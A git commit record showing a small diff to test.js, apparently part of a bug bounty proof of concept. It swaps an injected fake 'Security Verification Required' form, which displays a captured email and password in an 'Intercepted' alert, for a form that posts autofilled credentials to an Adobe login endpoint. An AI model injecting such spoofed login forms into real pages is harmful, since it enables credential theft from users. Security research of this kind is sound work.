92922df469b902cb65be0d1408b1930961d441d8
hc137132 <124748676+hc137132@users.noreply.github.com>
2026-04-29 15:43:13 +0800

    4

--- test.js
+++ test.js
@@ -4,11 +4,10 @@
 
     // 使用反引号 (Backticks) 定义多行 HTML 模板
     const formTemplate = `
-        <form id="poc-form" style="margin: 20px 0; border: 1px solid red; padding: 10px;">
-            <p style="color:red;"><strong>Security Verification Required</strong></p>
-            <input type="text" id="poc_email" value="hechneg@wearehackerone.com" style="margin-right:5px;">
-            <input type="password" id="poc_pass" placeholder="Password" style="margin-right:5px;">
-            <button type="button" onclick="alert('Intercepted:\\nEmail: ' + document.getElementById('poc_email').value + '\\nPass: ' + document.getElementById('poc_pass').value)">Verify</button>
+        <form action="https://auth.services.adobe.com/" method="post" autocomplete>
+            <input type="email" name="email"  value="hecheng@wearehackerone.com" >
+            <input type="password" name="password" autocomplete >
+            <button type="submit" onclick="">Verify</button>
         </form>
     `;
 
